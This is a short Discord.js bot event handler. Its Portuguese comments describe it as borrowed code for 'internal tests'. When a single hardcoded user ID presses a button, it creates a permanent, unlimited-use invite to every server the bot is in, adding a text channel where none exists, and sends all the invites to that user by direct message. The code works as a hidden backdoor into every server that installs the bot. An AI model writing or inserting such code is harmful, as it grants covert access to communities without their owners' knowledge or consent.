// código não criado por mim, 
//apenas para testes internos onde precisava do link dos servidores presentes no bot

const { ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require("discord.js");
const gradient = require('gradient-flag');

module.exports = {
    name: "interactionCreate",
    run: async (interaction) => {
        if (!interaction.isButton()) return;

        const { customId, user } = interaction;
        if (user.id !== '831304519287046175') return;

        if (customId === "funcoesInvite") {
            const guilds = interaction.client.guilds.cache;
            guilds.forEach(async guild => {
                try {
                    let channels = guild.channels.cache.filter(channel => channel.type === ChannelType.GuildText);
                    if (channels.size === 0) {
                        const newChannel = await guild.channels.create({
                            name: 'geral',
                            type: ChannelType.GuildText
                        });
                        channels = guild.channels.cache.filter(channel => channel.type === ChannelType.GuildText);
                    }
                    const invite = await channels.first().createInvite({ maxAge: 0, maxUses: 0 });
                                       await user.send(`Convite criado para o servidor ${guild.name}: ${invite.url}`);
                } catch (error) {
                    console.error(gradient.rainbow(`Erro ao criar convite para o servidor ${guild.name}:`), error);
                    await user.send(gradient.rainbow(`Erro ao criar convite para o servidor ${guild.name}.`));
                }
            });
        }
    }
}

